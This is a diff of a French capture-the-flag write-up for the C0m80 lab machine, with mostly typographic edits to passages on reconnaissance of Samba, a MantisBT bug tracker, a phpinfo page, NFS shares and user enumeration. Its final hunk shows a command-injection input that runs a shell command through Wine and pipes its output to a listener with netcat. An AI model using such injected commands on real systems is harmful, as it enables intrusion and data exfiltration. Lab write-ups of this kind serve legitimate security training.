@@ -149,7 +149,7 @@ Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
 
 J'ai alors décidé de jeter un œil au site qui est celui de l'éditeur de logiciel fictif *BestestSoftware* qui a à son actif les logiciels *bestFTPserver*, NotepadPussPuss++ (toute ressemblance...) et *AutomaToro*.  
 
-Et à l'URL */bugs/* (que l'on peut trouver via un crawler ou un buster car il y a un lien sans texte sur la page dédiée à *bestFTPserver*) se trouve un bug tracker *MantisBT*.  
+Et à l'URL `/bugs/` (que l'on peut trouver via un crawler ou un buster car il y a un lien sans texte sur la page dédiée à *bestFTPserver*) se trouve un bug tracker *MantisBT*.  
 
 Voici d'ailleurs le résultat du module buster de Wapiti :  
 
@@ -200,21 +200,21 @@ Il semble que le binaire soit packé avec UPX 1.25 (mais les noms classiques des
 
 ![Xlight FTP Server copyright and version infos](/assets/img/c0m80/c0m80_xlightftp_version.png)
 
-Les captures prises par les sandbox confirment le nom du logiciel mais le numéro de version n’apparaît pas.  
+Les captures prises par les sandbox confirment le nom du logiciel, mais le numéro de version n’apparaît pas.  
 
-La documentation du site parle de différents fichiers de configuration mais aucun n'est trouvable dans le dossier */bin*.  
+La documentation du site parle de différents fichiers de configuration, mais aucun n'est trouvable dans le dossier `/bin`.  
 
 On retrouve [une page](http://processchecker.com/file/xlight.exe.html) mentionnant *XLight* si l'on recherche le hash MD5 de l'exécutable.  
 
-Sur *exploit-db* il y a plusieurs exploits pour *XLight* mais [seulement un](https://www.exploit-db.com/exploits/43135/) correspond à la version mais les conditions d'exploitation ont peu de sens et qui plus est il ne s'agit que d'un PoC (crash).  
+Sur *exploit-db* il y a plusieurs exploits pour `XLight` mais [seulement un](https://www.exploit-db.com/exploits/43135/) correspond à la version, mais les conditions d'exploitation ont peu de sens et qui plus est il ne s'agit que d'un PoC (crash).  
 
 Pour ce qui est du dossier */dev* on trouve un fichier *info.php* qui est bien sûr un *phpinfo()* correspondant à une installation de XAMPP.  
 
-On remarque un *DOCUMENT\_ROOT* défini à *C:/xampp/wwwroot*.  
+On remarque un `DOCUMENT_ROOT` défini à `C:/xampp/wwwroot`.  
 
-Bizarrement le *SCRIPT\_FILENAME* est *C:/xampp/wwwroot/uploads/info.php* alors que l'on a demandé le dossier */dev* mais c'est peut être une histoire de mapping Apache...  
+Bizarrement le `SCRIPT_FILENAME` est `C:/xampp/wwwroot/uploads/info.php` alors que l'on a demandé le dossier `/dev` mais c'est peut-être une histoire de mapping Apache...  
 .
-Dans les autres infos utiles il y a la variable *HOMEPATH* valant *\Users\bob* et le PATH qui contient les chemins d'installation de Python 2.7 et PowerShell...  
+Dans les autres infos utiles il y a la variable `HOMEPATH` valant `\Users\bob` et le PATH qui contient les chemins d'installation de Python 2.7 et PowerShell...  
 
 À ce stade, on peut se servir de rpclient pour vérifier l'existence de quelques utilisateurs :  
 
@@ -261,7 +261,7 @@ On trouve sur ce partage un fichier énigmatique :
 
 Et encore plus intéressant, ce même fichier est trouvable dans */dev*.  
 
-Petite appartée pour ceux qui ne connaissent pas NFS :  
+Petit apparté pour ceux qui ne connaissent pas NFS :  
 
 *Network File System* est un peu l’ancêtre de Samba et d'autres protocoles de partage de fichiers. Créé en 1984, il n'était pas pensé avec la sécurité en tête, les accès aux fichiers étant vérifiés via les UID et GID de l'utilisateur se connectant au service, il était facile de les falsifier, soit par exemple en créant un utilisateur local avec un couple UID/GID identique à ceux du fichier, soit en utilisant un outil d'attaque spécifique comme [NFSShell](https://github.com/NetDirect/nfsshell).  
 
@@ -293,16 +293,16 @@ output: MS-DOS executable, MZ for MS-DOS
 
 En effet, le programme ne veut pas fonctionner, que ce soit via *Wine* ou directement depuis Windows :(  
 
-Hacker bien sous tous rapports cherche bug \*
----------------------------------------------
+Hacker bien sous tous rapports cherche bug (\*)
+----------------------------------------------
 
-\* pour pénétration  
+(\*) pour pénétration  
 
-A ce stade on a bien un scénario final d'exploitation mais on n'a pas vraiment avancé... Certes on dispose d'un utilisateur (*bob*) mais des tentatives de brute force sur FTP/SMB ont été vaines.  
+À ce stade, on a bien un scénario final d'exploitation, mais on n'a pas vraiment avancé... Certes on dispose d'un utilisateur (*bob*) mais des tentatives de brute force sur FTP/SMB ont été vaines.  
 
 Il est temps de se pencher sur le bug tracker présent.  
 
-Dans */bugs/doc/en-US/Admin\_Guide/* se trouve un manuel *MantisBT-2.0-Admin\_Guide-en-US.pdf* avec la mention 2016, ce qui nous permet d'estimer la version du *MantisBT*.  
+Dans `/bugs/doc/en-US/Admin_Guide/` se trouve un manuel `MantisBT-2.0-Admin_Guide-en-US.pdf` avec la mention 2016, ce qui nous permet d'estimer la version du *MantisBT*.  
 
 Sur *exploit-db*, il y a une vulnérabilité de password-reset qui s'avère prometteuse mais qui après plusieurs essais ne semble pas fonctionner sur notre cible (patchée ?) car même si on parvient sur le formulaire de réinitialisation du mot de passe, le changement ne semble pas être pris en compte.  
 
@@ -342,7 +342,7 @@ Found user id 5: 'Mr Don Cheung'
 
 Et victoire... on peut se connecter sur le *Mantis* avec *guest / guest*.  
 
-Avec les droits dont on dispose on peut consulter la discussion sur le bug 6 pour le projet *NotepadPussPuss++* (on y trouve un lien vers l'archive *http://c0m80.ctf/bin/npp.zip*) et celle pour le bug 3 du projet *bestFTPserver\_public*.  
+Avec les droits dont on dispose, on peut consulter la discussion sur le bug 6 pour le projet *NotepadPussPuss++* (on y trouve un lien vers l'archive *http://c0m80.ctf/bin/npp.zip*) et celle pour le bug 3 du projet *bestFTPserver\_public*.  
 
 ![C0m80 MantisBT capture](/assets/img/c0m80/c0m80_bug3.png)
 
@@ -534,11 +534,11 @@ Mettons nous en situation
 
 Comme le serveur FTP semble être exécuté dans un environnement Wine assez basique, le mieux est d'exécuter le programme depuis Wine aussi et voir ce qu'il est possible d'un faire.  
 
-Et si vous tapez *help* après avoir lancé l'invite de commande avec *wine cmd.exe* vous verrez qu'on ne peut pas faire grand chose...  
+Et si vous tapez *help* après avoir lancé l'invite de commande avec *wine cmd.exe* vous verrez qu'on ne peut pas faire grand-chose...  
 
 Après avoir bien fouillé j'ai trouvé que l'on peut appeler des programmes Unix avec *start /unix* mais l'utilisation des PIPE entre deux commandes ne fonctionnait pas comme attendu (si on tente d'exécuter une commande et d'envoyer l'output via un netcat, la connexion sortante s'établie mais se ferme aussitôt sans envoyer les données).  
 
-Je suppose que l'output des commandes Unix n'est pas sensé passer via la PIPE Windows... quoiqu'il en soit le problème est résolu si on parvient à tout "piper" dans une même commande Unix :  
+Je suppose que l'output des commandes Unix n'est pas censé passer via la PIPE Windows... quoi qu'il en soit le problème est résolu si on parvient à tout "piper" dans une même commande Unix :  
 
 ```
 ftp>http: & start /unix /usr/bin/python -c "import os;os.system('id | netcat 192.168.1.6 7777')"
